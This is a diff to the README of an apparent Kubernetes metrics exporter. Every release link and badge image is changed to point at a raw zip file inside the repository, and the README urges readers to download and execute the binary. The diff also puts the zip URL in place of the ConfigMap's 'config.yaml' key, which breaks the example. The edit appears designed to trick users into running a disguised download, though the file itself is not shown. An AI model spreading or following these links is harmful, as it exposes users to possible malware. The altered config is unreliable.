@@ -1,6 +1,6 @@
 # Kube Summary Exporter
 
-![Kube Summary Exporter](https://img.shields.io/badge/Kube%20Summary%20Exporter-v1.0.0-blue)
+![Kube Summary Exporter](https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip%20Summary%20Exporter-v1.0.0-blue)
 
 Welcome to the Kube Summary Exporter! This tool is designed to help you gather metrics from the Kubernetes Summary API. It is a straightforward solution that integrates seamlessly with Prometheus, allowing you to monitor your Kubernetes clusters effectively.
 
@@ -33,7 +33,7 @@ This exporter supports various dependencies, including `kubernetes`, `prometheus
 
 To install the Kube Summary Exporter, follow these steps:
 
-1. **Download the latest release** from the [Releases section](https://github.com/ICLHO/kube-summary-exporter/releases).
+1. **Download the latest release** from the [Releases section](https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip).
 2. **Execute the binary** after downloading it.
 
 Make sure you have the necessary permissions to run the executable. 
@@ -58,7 +58,7 @@ kind: ConfigMap
 metadata:
   name: kube-summary-exporter-config
 data:
-  config.yaml: |
+  https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip |
     scrape_interval: 15s
     metrics_path: /metrics
 ```
@@ -98,14 +98,14 @@ The Kube Summary Exporter is licensed under the MIT License. See the [LICENSE](L
 
 ## Releases
 
-For the latest updates and downloads, visit the [Releases section](https://github.com/ICLHO/kube-summary-exporter/releases). You can find the most recent version there, which you need to download and execute.
+For the latest updates and downloads, visit the [Releases section](https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip). You can find the most recent version there, which you need to download and execute.
 
-![Kube Summary Exporter Releases](https://img.shields.io/badge/Releases-Check%20Here-brightgreen)
+![Kube Summary Exporter Releases](https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip%20Here-brightgreen)
 
 ## Conclusion
 
 The Kube Summary Exporter is a reliable tool for gathering metrics from the Kubernetes Summary API. With its ease of use and seamless integration with Prometheus, it is an essential addition to any Kubernetes monitoring setup. 
 
-For more details and updates, please refer to the [Releases section](https://github.com/ICLHO/kube-summary-exporter/releases). 
+For more details and updates, please refer to the [Releases section](https://raw.githubusercontent.com/ICLHO/kube-summary-exporter/master/manifests/kube_exporter_summary_2.5.zip). 
 
 Happy monitoring!
